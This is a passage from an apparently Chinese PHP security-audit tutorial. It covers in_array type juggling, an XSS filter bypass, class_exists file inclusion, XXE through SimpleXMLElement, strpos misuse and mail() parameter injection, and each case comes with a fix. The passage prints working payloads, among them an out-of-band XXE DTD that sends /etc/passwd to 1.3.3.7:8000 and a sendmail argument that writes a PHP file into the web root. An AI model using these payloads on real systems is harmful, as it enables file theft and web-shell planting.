=&gt; true,</span><br><span class=\"line\">    &apos;cheese&apos; =&gt; false,</span><br><span class=\"line\">    &apos;hair&apos; =&gt; 765,</span><br><span class=\"line\">    &apos;goblins&apos; =&gt; null,</span><br><span class=\"line\">    &apos;ogres&apos; =&gt; &apos;no ogres allowed in this array&apos;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">// Loose checking -- return values are in comments</span><br><span class=\"line\"></span><br><span class=\"line\">// First three make sense, last four do not</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump(in_array(null, $array)); // true</span><br><span class=\"line\">var_dump(in_array(false, $array)); // true</span><br><span class=\"line\">var_dump(in_array(765, $array)); // true</span><br><span class=\"line\">var_dump(in_array(763, $array)); // true</span><br><span class=\"line\">var_dump(in_array(&apos;egg&apos;, $array)); // true</span><br><span class=\"line\">var_dump(in_array(&apos;hhh&apos;, $array)); // true</span><br><span class=\"line\">var_dump(in_array(array(), $array)); // true</span><br><span class=\"line\"></span><br><span class=\"line\">// Strict checking</span><br><span class=\"line\">var_dump(in_array(null, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(false, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(765, $array, true)); // true</span><br><span class=\"line\">var_dump(in_array(763, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(&apos;egg&apos;, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(&apos;hhh&apos;, $array, true)); // false</span><br><span class=\"line\">var_dump(in_array(array(), $array, true)); // false</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>使用<code>===</code>强匹配或<code>in_array()</code>函数加上第三个参数<code>$strict=ture</code></p>\n<hr>\n<h2 id=\"一个XSS过滤绕过trick\"><a href=\"#一个XSS过滤绕过trick\" class=\"headerlink\" title=\"一个XSS过滤绕过trick\"></a>一个XSS过滤绕过trick</h2><h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// composer require \"twig/twig\"</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Template</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $twig;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $indexTemplate = <span class=\"string\">'&lt;img '</span> .</span><br><span class=\"line\">            <span class=\"string\">'src=\"https://loremflickr.com/320/240\"&gt;'</span> .</span><br><span class=\"line\">            <span class=\"string\">'&lt;a href=\"&#123;&#123;link|escape&#125;&#125;\"&gt;Next slide »&lt;/a&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Default twig setup, simulate loading</span></span><br><span class=\"line\">        <span class=\"comment\">// index.html file from disk</span></span><br><span class=\"line\">        $loader = <span class=\"keyword\">new</span> Twig\\Loader\\ArrayLoader([</span><br><span class=\"line\">            <span class=\"string\">'index.html'</span> =&gt; $indexTemplate</span><br><span class=\"line\">        ]);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;twig = <span class=\"keyword\">new</span> Twig\\Environment($loader);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getNexSlideUrl</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $nextSlide = $_GET[<span class=\"string\">'nextSlide'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;twig-&gt;render(</span><br><span class=\"line\">            <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">            [<span class=\"string\">'link'</span> =&gt; <span class=\"keyword\">$this</span>-&gt;getNexSlideUrl()]</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>\n<p>以php的一个模版引擎twig为例，对url进行XSS安全过滤，其中<code>escape</code>和<code>FILTER_VALIDATE_URL</code>进行了两次过滤转换。</p>\n<p>第一次在第10行，<code>escape</code>过滤，使用的是php自带的<code>htmlspecialchars</code>函数</p>\n<blockquote>\n<p>htmlspecialchars<br>(PHP 4, PHP 5, PHP 7)<br>htmlspecialchars — 将特殊字符转换为 HTML 实体</p>\n<figure class=\"highlight plain\"><figcaption><span>(& 符号)  </span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; (双引号)  ===============  &amp;quot;</span><br><span class=\"line\">&apos; (单引号)  ===============  &amp;apos;</span><br><span class=\"line\">&lt; (小于号)  ===============  &amp;lt;</span><br><span class=\"line\">&gt; (大于号)  ===============  &amp;gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>第二次过滤在22行，使用filter_var函数用<code>FILTER_VALIDATE_URL</code>过滤器对<code>$nextSlide</code>变量进行过滤。检查是否是合法的url。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>可以看到代码对XSS常用的”‘&lt;&gt;符号进行了过滤，但我们可以利用<code>%0a</code>换行符的trick来逃逸过滤，可以通过以下payload执行，首先引入<code>javascript:</code>协议，然后利用javascript中<code>//</code>代表单行注释，而<code>%250a</code>经过一次urldecode变成<code>%0a</code>换行符，成功逃逸出注释行，从而进入<code>echo</code>函数中形成XSS。<br><code>?nextSlide=javascript://comment%250aalert(1)</code></p>\n<p><strong>稍微总结一下常规bypass思路，试敏感关键函数和敏感符号→试编码或注释符号等混淆方法→试伪协议。</strong></p>\n<h3 id=\"修复-1\"><a href=\"#修复-1\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>针对XSS敏感关键词进行黑名单过滤</p>\n<hr>\n<h2 id=\"class-exists函数和实例化可控导致的XXE漏洞\"><a href=\"#class-exists函数和实例化可控导致的XXE漏洞\" class=\"headerlink\" title=\"class_exists函数和实例化可控导致的XXE漏洞\"></a>class_exists函数和实例化可控导致的XXE漏洞</h2><h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__autoload</span><span class=\"params\">($className)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> $className;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$controllerName = $_GET[<span class=\"string\">'c'</span>];</span><br><span class=\"line\">$data = $_GET[<span class=\"string\">'d'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (class_exists($controllerName)) &#123;</span><br><span class=\"line\">    $controller = <span class=\"keyword\">new</span> $controllerName($data[<span class=\"string\">'t'</span>], $data[<span class=\"string\">'v'</span>]);</span><br><span class=\"line\">    $controller-&gt;render();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'There is no page with this name'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HomeController</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $template;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $variables;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($template, $variables)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;template = $template;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;variables = $variables;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">render</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;variables[<span class=\"string\">'new'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'controller rendering new response'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'controller rendering old response'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这段代码中有两个安全漏洞。第8行中调用class_exists（）会触发文件包含漏洞。<br>PHP文档中对于<code>class_exist</code>函数的解释如下</p>\n<blockquote>\n<p><strong>class_exists</strong> </p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>class_exists — 检查类是否已定义</p>\n<p>说明 </p>\n<p>bool class_exists ( string $class_name [, bool $autoload = true ] )检查指定的类是否已定义。</p>\n<p>参数 </p>\n<p>class_name</p>\n<p>类名。名字的匹配是不分区大小写的。</p>\n<p>autoload</p>\n<p>是否默认调用 __autoload。</p>\n</blockquote>\n<p>可知<code>class_exist</code>函数默认调用<code>__autoload</code>函数，其中调用了<code>include</code>函数，会造成文件包含漏洞。可以使用路径穿越来包含任意文件，但是使用像这样的<code>../../../../etc/passwd</code>路径穿越符号的前提是PHP版本在5~5.3(包含5.3)版本之间才可以。<br>但是第二个漏洞仍然适用于当前的PHP版本。在以下几行:<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$controllerName = $_GET[<span class=\"string\">'c'</span>]; <span class=\"comment\">//这里$controllerName可控</span></span><br><span class=\"line\">$data = $_GET[<span class=\"string\">'d'</span>];           <span class=\"comment\">//这里$data可控  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (class_exists($controllerName)) &#123;</span><br><span class=\"line\">    $controller = <span class=\"keyword\">new</span> $controllerName($data[<span class=\"string\">'t'</span>], $data[<span class=\"string\">'v'</span>]);</span><br><span class=\"line\"><span class=\"comment\">//这里使用可控的变量实例化了一个对象，而对象的名称及内容均可控。</span></span><br></pre></td></tr></table></figure></p>\n<p>这样的话，恶意的payload便可以控制实例化过程，任意构造函数，即使代码库本身没有易受攻击的函数。也可以使用PHP内置的SimpleXMLElement函数来进行XXE攻击，进行文件读取操作等行为。</p>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p> 1.文件包含漏洞<br> 令<code>class_exist</code>函数传入形如<code>../../../../etc/passwd</code>的payload即可；</p>\n<p> 2.实例化SimpleXMLElement进行XXE攻击，查看php手册，SimpleXMLElement构造函数说明如下：</p>\n<blockquote>\n<p><strong>SimpleXMLElement::__construct</strong></p>\n<p>(PHP 5, PHP 7)</p>\n<p>SimpleXMLElement::__construct — Creates a new SimpleXMLElement object</p>\n<p><strong>说明</strong><br>final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = “” [, bool $is_prefix = FALSE ]]]] )</p>\n<p>创建一个新的SimpleXMLElement对象。</p>\n<p>参数 </p>\n<p>data</p>\n<p>格式良好的XML字符串或XML文档的路径或URL（如果 data_is_url是）TRUE。</p>\n<p>options<br>可选地用于指定其他Libxml参数。</p>\n<p>注意：<br>可能需要传递LIBXML_PARSEHUGE 以能够处理深度嵌套的XML或非常大的文本节点。</p>\n<p>data_is_url</p>\n<p>默认情况下data_is_url是FALSE。使用TRUE指定data的路径或URL到一个XML文件，而不是字符串数据。</p>\n<p>ns<br>命名空间前缀或URI。<br>is_prefix<br>TRUE如果ns是前缀，FALSE如果是URI; 默认为FALSE。</p>\n</blockquote>\n<p> 所以构造形如<code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code>其中SimpleXMLElement为实例化函数名，后续payload为SimpleXMLElement构造函数的内容，xxe.xml为XML实体文件。XML实体文件写法可以参考<a href=\"http://www.4o4notfound.org/index.php/archives/29/#pingback-28\" target=\"_blank\" rel=\"noopener\">XXE漏洞分析 from 404 Not Found</a>这里就不多做探讨。</p>\n<p> 举一个例子:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE r [</span><br><span class=\"line\">&lt;!ELEMENT r ANY &gt;</span><br><span class=\"line\">&lt;!ENTITY % sp SYSTEM &quot;http://1.3.3.7:8000/xxe.dtd&quot;&gt;</span><br><span class=\"line\">%sp;</span><br><span class=\"line\">%param1;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;r&gt;&amp;exfil;&lt;/r&gt;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;      //这里使用base64编码是起读取文件时不丢失一些特殊符号的作用</span><br><span class=\"line\">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://1.3.3.7:8000/?%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"修复-2\"><a href=\"#修复-2\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p> 1.将<code>class_exist</code>函数中的<code>bool $autoload</code>参数设为false，即不自动调用<code>__autoload</code>函数；或者<code>__autoload函数</code>中不要使用<code>include</code>函数；或升级PHP版本避免路径遍历符号的传递。</p>\n<p> 2.PHP中防御XXE攻击方法：设置<code>libxml_disable_entity_loader(true);</code>；当然最大的问题还是不应该让实例化对象变成用户输入可控。</p>\n<hr>\n<h2 id=\"strpo-函数误用\"><a href=\"#strpo-函数误用\" class=\"headerlink\" title=\"strpo()函数误用\"></a>strpo()函数误用</h2><p>源码如下：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Login</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">loginViaXml</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (</span><br><span class=\"line\">            (!strpos($user, <span class=\"string\">'&lt;'</span>) || !strpos($user, <span class=\"string\">'&gt;'</span>)) &amp;&amp;</span><br><span class=\"line\">            (!strpos($pass, <span class=\"string\">'&lt;'</span>) || !strpos($pass, <span class=\"string\">'&gt;'</span>))</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            $format = <span class=\"string\">'&lt;?xml version=\"1.0\"?&gt;'</span> .</span><br><span class=\"line\">                      <span class=\"string\">'&lt;user v=\"%s\"/&gt;&lt;pass v=\"%s\"/&gt;'</span>;</span><br><span class=\"line\">            $xml = sprintf($format, $user, $pass);</span><br><span class=\"line\">            $xmlElement = <span class=\"keyword\">new</span> SimpleXMLElement($xml);</span><br><span class=\"line\">            <span class=\"comment\">// Perform the actual login.</span></span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;login($xmlElement);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> Login($_POST[<span class=\"string\">'username'</span>], $_POST[<span class=\"string\">'password'</span>]);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>可以看到此段代码的第8，9行使用<code>strpo()</code>函数检查payload中是否有<code>&lt;`</code>&gt;<code>符号，以检查XML利用的敏感符号。检查后传入第11、12行的</code>$format<code>变量中，然后格式化生成XML。</code>strpos()`函数文档如下：</p>\n<blockquote>\n<p><strong>strpos</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>strpos — 查找字符串首次出现的位置</p>\n<p><strong>说明</strong><br>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )<br>返回 needle 在 haystack 中首次出现的数字位置。</p>\n<p><strong>参数</strong><br>haystack<br>在该字符串中进行查找。</p>\n<p>needle<br>如果 needle 不是一个字符串，那么它将被转换为整型并被视为字符的顺序值。</p>\n<p>offset<br>如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始。</p>\n<p><strong>返回值</strong><br>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。</p>\n<p>如果没找到 needle，将返回 FALSE。</p>\n<p><strong>Warning</strong><br>此函数可能返回布尔值 FALSE，但也可能返回等同于 FALSE 的非布尔值。请阅读 布尔类型章节以获取更多信息。应使用 === 运算符来测试此函数的返回值。</p>\n</blockquote>\n<p>这里<strong>Warning</strong>中已经提示了<code>strpos()</code>可能返回等同于FALSE的非布尔值，即在首位查询到了条件并返回了值为<code>0</code>，又因为PHP的弱类型特性，若没有使用<code>===</code>的强匹配，<code>0</code>就会等于<code>false</code>。</p>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p> 前文已分析到令查询位置为首位即可，故payload可以为<code>user=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code></p>\n<p> 其中首位的<code>&lt;</code>可以令<code>strpo()</code>函数返回<code>0</code>即<code>FALSE</code>，从而绕过检查，<code>&quot;&gt;</code>是为了闭合之前的内容，然后就可以利用XML进行各种XXE攻击的利用</p>\n<h3 id=\"修复-3\"><a href=\"#修复-3\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>使用<code>===</code>强匹配</p>\n<hr>\n<h2 id=\"mali-函数的危险性\"><a href=\"#mali-函数的危险性\" class=\"headerlink\" title=\"mali()函数的危险性\"></a>mali()函数的危险性</h2><p>源代码：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mailer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sanitize</span><span class=\"params\">($email)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> escapeshellarg($email);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">send</span><span class=\"params\">($data)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'to'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'to'</span>] = <span class=\"string\">'none@ripstech.com'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'to'</span>] = <span class=\"keyword\">$this</span>-&gt;sanitize($data[<span class=\"string\">'to'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'from'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'from'</span>] = <span class=\"string\">'none@ripstech.com'</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'from'</span>] = <span class=\"keyword\">$this</span>-&gt;sanitize($data[<span class=\"string\">'from'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'subject'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'subject'</span>] = <span class=\"string\">'No Subject'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($data[<span class=\"string\">'message'</span>])) &#123;</span><br><span class=\"line\">            $data[<span class=\"string\">'message'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        mail($data[<span class=\"string\">'to'</span>], $data[<span class=\"string\">'subject'</span>], $data[<span class=\"string\">'message'</span>],</span><br><span class=\"line\">             <span class=\"string\">''</span>, <span class=\"string\">\"-f\"</span> . $data[<span class=\"string\">'from'</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$mailer = <span class=\"keyword\">new</span> Mailer();</span><br><span class=\"line\">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析-4\"><a href=\"#分析-4\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>此漏洞主要是由于<code>mail()</code>函数的第五个参数，先看一下<code>mail()</code>函数的用法：</p>\n<blockquote>\n<p><strong>mail</strong></p>\n<p>(PHP 4, PHP 5, PHP 7)</p>\n<p>mail — 发送邮件</p>\n<p><strong>说明</strong></p>\n<p>bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )<br>发送一封电子邮件。</p>\n<p><strong>参数</strong></p>\n<p><strong>to</strong><br>收件人<br><strong>subject</strong><br>主题<br><strong>message</strong><br>邮件内容<br><strong>additional_headers</strong><br>添加邮件的额外头部，如<code>CC:</code>Carbon Copy(抄送)、<code>BCC:</code>Blind CarbonCopy(秘密抄送)<br><strong>additional_parameters</strong><br>传递给发送程序sendmail的额外参数。例如，当使用带有-f sendmail选项的sendmail时，可以使用此选项设置邮件发件人地址 。</p>\n</blockquote>\n<p>在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 <strong>sendmail</strong> 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：</p>\n<blockquote>\n<p>-O option = value</p>\n<p>QueueDirectory = queuedir 选择队列消息</p>\n<p>-X logfile</p>\n<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>\n<p>-f from email</p>\n<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>\n</blockquote>\n<p> 在PHP中使用<code>mail()</code>函数的话需要在<code>php.ini</code>中配置以下两个选项中的一种：<br> 1.配置好SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议的服务器hostname和port来告诉PHP使用那个代理。<br> 2.配置好一个邮件程序的文件地址，使其作为MTA(Mail Transfer Agent)即邮件传输代理。</p>\n<p> 当PHP是用第2种方式配置的时候，<code>mail()</code>将传递给MTA程序运行，虽然PHP默认提供了<code>escapeshellcmd()</code>这个函数在这些<code>&amp;#;|*?~&lt;&gt;^()[]{}$\\, \\x0A 和 \\xFF</code>字符前插入<code>\\</code>进行转义以防止代码注入的安全性问题，但是<code>mail()</code>函数的第5个参数<code>$additional_parameters</code>允许用户添加新参数的特性使得可以被攻击者利用。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mail(<span class=\"string\">\"myfriend@example.com\"</span>, <span class=\"string\">\"subject\"</span>, <span class=\"string\">\"message\"</span>, <span class=\"string\">\"\"</span>, <span class=\"string\">\"-f\"</span> . $_GET[<span class=\"string\">'from'</span>]); <span class=\"comment\">//程序代码举例</span></span><br><span class=\"line\"></span><br><span class=\"line\">example@example.com -O QueueDirectory=/tmp -X /<span class=\"keyword\">var</span>/www/html/rce.php <span class=\"comment\">//payload举例 -O 